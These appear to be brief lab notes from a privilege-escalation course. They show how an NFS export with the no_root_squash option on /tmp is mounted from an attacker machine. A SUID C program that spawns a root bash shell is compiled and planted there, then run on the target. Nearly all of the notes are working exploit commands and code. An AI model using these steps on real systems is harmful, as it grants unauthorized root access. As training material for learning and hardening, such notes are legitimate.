### TCM
```
cat /etc/exports
“no_root_squash” option is defined for the “/tmp” export.
```
### Attacker Kali
```
showmount -e MACHINE_IP
mkdir /tmp/rogo
mount -o rw,vers=3 MACHINE_IP:/tmp /tmp/rogo

nano /tmp/rogo/exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

cat /tmp/rogo/exploit.c
gcc -static /tmp/rogo/exploit.c -o /tmp/rogo/exploit
chmod +s /tmp/rogo/exploit
```
### TCM
```
cd /tmp
ls
./exploit
#whoami
```
